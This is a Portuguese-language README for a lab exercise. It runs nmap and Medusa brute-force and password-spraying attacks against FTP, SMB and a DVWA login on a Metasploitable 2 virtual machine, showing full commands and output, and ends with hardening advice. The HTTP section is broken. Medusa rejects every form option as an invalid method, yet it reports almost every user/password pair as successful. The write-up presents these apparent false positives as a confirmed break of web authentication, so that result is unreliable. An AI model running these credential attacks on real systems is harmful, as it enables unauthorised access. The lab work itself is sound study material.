# dio-medusa-bruteforce
Desafio-Dio

# 🛡️ Simulação de Ataques de Força Bruta com Medusa e Metasploitable 2

Este projeto apresenta a implementação prática de testes de intrusão e auditoria de credenciais vulneráveis utilizando a ferramenta **Medusa**. O laboratório foi desenvolvido em ambiente controlado para analisar a viabilidade de ataques de força bruta, password spraying e propor medidas efetivas de mitigação e prevenção.

---

## 💻 Arquitetura do Ambiente de Laboratório

O laboratório foi estruturado utilizando uma máquinas virtual isolada em rede interna local e uma maquina fisica:

- **Máquina Atacante:** Ubuntu Linux (`192.168.18.42`)
- **Máquina Vítima:** Metasploitable 2 (`192.168.18.90`)
- **Ferramentas Utilizadas:** `nmap`, `medusa`


## 🔍 Phase 1: Varredura e Enumeração de Serviços

Antes dos ataques de força bruta, foi realizada uma enumeração das portas ativas no alvo para mapear a superfície de ataque:

```bash
nmap -sV -p 21,80,445 192.168.18.90

potasso@potasso-Latitude-3490:~$ nmap -sV -p 21,80,445 192.168.18.90
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-04 19:51 -03
Nmap scan report for 192.168.18.90
Host is up (0.0060s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds


Portas Mapeadas:

21/tcp - FTP (vsftpd 2.3.4)

80/tcp - HTTP (Apache / DVWA)

445/tcp - SMB (Samba)

## 🚀 Phase 2: Simulação dos Cenários de Ataque

Ataque de Força Bruta em Serviço FTP (Porta 21)
Testagem de dicionário direcionada ao serviço FTP para validação de credenciais fracas no usuário msfadmin.
para esse passo foi criado dois arquivos user.txt contento nomes depossiveis usuarios e pass.txt com possiveis senhas

potasso@potasso-Latitude-3490:~$ medusa -h 192.168.18.90 -U users.txt  -P pass.txt -M ftp -t 6
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.18.90 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)


Resultado: Acesso obtido com sucesso. Credencial identificada: msfadmin:msfadmin


Password Spraying em SMB (Porta 445)
Simulação corporativa para evitar o bloqueio de contas (Account Lockout). Uma única senha padrão/fraca foi testada contra uma lista de múltiplos usuários conhecidos (users.txt)

potasso@potasso-Latitude-3490:~$ medusa -h 192.168.18.90 -U users.txt -p msfadmin -M smbnt -t 2
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [smbnt] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 1 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (1 of 1 complete)
ACCOUNT FOUND: [smbnt] Host: 192.168.18.90 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
ACCOUNT CHECK: [smbnt] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: msfadmin (1 of 1 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (1 of 1 complete)


Resultado: Identificação de reutilização de senha fraca no serviço de compartilhamento de rede SMB.
usuario msfadmin e senha msfadmin com acesso administrativo


Automação de Formulário HTTP / DVWA (Porta 80)
Execução de força bruta automatizada em formulário POST de autenticação web no endpoint do DVWA (Damn Vulnerable Web Application)

potasso@potasso-Latitude-3490:~$ medusa -h 192.168.18.90 -U users.txt -P pass.txt -M http -m PAGE:'/dwa/login/.php' -m FORM 'username=^USER^&password=^PASS^&Login=login' -m 'FAIL=Login falied' -t 6
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: WARNING: Invalid method: PAGE.
Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login falied.
WARNING: Invalid method: FAIL=Login falied.
WARNING: Invalid method: FAIL=Login falied.
WARNING: Invalid method: FAIL=Login falied.
WARNING: WARNING: Invalid method: FAIL=Login falied.
Invalid method: FAIL=Login falied.
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: user Password: 123456 [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: 123456 (1 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: admin Password: 123456 [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: root Password: 123456 [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (1 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: msfadmin Password: qwerty [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: password (2 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: msfadmin Password: password [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 6 complete) Password: msfadmin (2 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: user Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: msfadmin (2 of 4, 7 complete) Password: 123456 (3 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: msfadmin Password: 123456 [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 8 complete) Password: password (3 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: user Password: password [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.18.90 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: qwerty (4 of 4 complete)
ACCOUNT FOUND: [http] Host: 192.168.18.90 User: user Password: qwerty [SUCCESS]


Resultado: Quebra de autenticação da aplicação web e confirmação de credencial de administrador



🛡️ Medidas de Mitigação e Hardening Defensivo
Para proteger serviços corporativos contra as táticas demonstradas neste laboratório, recomendam-se as seguintes contramedidas:

Políticas de Bloqueio de Conta (Account Lockout Policy): Configurar limite de tentativas seguidas de autenticação (ex: máximo de 3 a 5 falhas) para mitigar ataques de força bruta direta

Autenticação Multifator (MFA/2FA): Impor autenticação de dois fatores em todos os serviços expostos (Web Apps, VPNs, SSH/FTP)

Desativação e Substituição de Protocolos Legados: Descontinuar o uso de FTP não criptografado e migrar para SFTP/SSH. Desabilitar dialetos antigos do SMB (SMBv1).

Monitoramento e SIEM: Criar alertas automatizados no SIEM para identificar padrões de falhas de login em massa originados de um único IP em curto intervalo de tempo.







